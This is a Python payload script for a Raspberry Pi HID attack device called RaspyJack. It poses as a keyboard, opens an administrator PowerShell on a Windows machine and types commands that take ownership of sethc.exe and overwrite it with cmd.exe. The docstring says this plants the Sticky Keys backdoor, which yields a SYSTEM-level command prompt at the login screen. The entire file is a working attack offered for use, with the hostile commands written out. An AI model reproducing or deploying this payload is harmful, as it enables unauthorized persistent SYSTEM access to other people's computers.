#!/usr/bin/env python3
import sys
sys.path.append('/root/Raspyjack/')
"""
RaspyJack *payload* – **HID Attack: Sticky Keys Backdoor**
============================================================
A HID attack that replaces the Sticky Keys executable (`sethc.exe`) with
a copy of the Command Prompt (`cmd.exe`).

This is a classic persistence technique. After this payload is run,
pressing the Shift key five times on the Windows login screen will open
a Command Prompt with SYSTEM-level privileges, as `sethc.exe` is run
by the SYSTEM account.

**NOTE:** This requires the user to accept a UAC prompt.
"""

import os, sys, subprocess, time
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

from hid_helper import hid_helper # Import the new HID helper

# --- Display Functions ---
def show_message(lines, color="lime"):
    if not HARDWARE_LIBS_AVAILABLE:
        for line in lines:
            print(line)
        return
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    if not HARDWARE_LIBS_AVAILABLE:
        print("ERROR: Hardware libraries not available. Cannot run HID attack.", file=sys.stderr)
        return

    show_message(["HID Attack:", "Sticky Keys"])
    
    if not hid_helper.is_hid_gadget_enabled:
        show_message(["ERROR:", "HID Gadget NOT", "enabled!"], "red")
        time.sleep(3)
        return

    # Commands to take ownership of sethc.exe and replace it with cmd.exe
    cmd1 = "takeown /f c:\\windows\\system32\\sethc.exe"
    cmd2 = "icacls c:\\windows\\system32\\sethc.exe /grant administrators:f"
    cmd3 = "copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\sethc.exe"

    try:
        hid_helper.press_modifier_key(hid_helper.keyboard.left_gui, hid_helper.keyboard.x) # Win+X
        time.sleep(0.5)
        hid_helper.press_key(hid_helper.keyboard.a) # 'a' for Admin PowerShell
        time.sleep(1.5) # Wait for UAC prompt and PowerShell to open
        hid_helper.type_string(cmd1)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string(cmd2)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string(cmd3)
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.2)
        hid_helper.type_string("y") # Confirm overwrite
        hid_helper.press_key(hid_helper.keyboard.enter)
        time.sleep(0.5)
        hid_helper.type_string("exit")
        hid_helper.press_key(hid_helper.keyboard.enter)
        
        show_message(["Attack Sent!", "Sticky Keys"])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(3)
    finally:
        if HARDWARE_LIBS_AVAILABLE:
            LCD = LCD_1in44.LCD()
            LCD.LCD_Clear()
            GPIO.cleanup()
        print("HID Attack payload finished.")
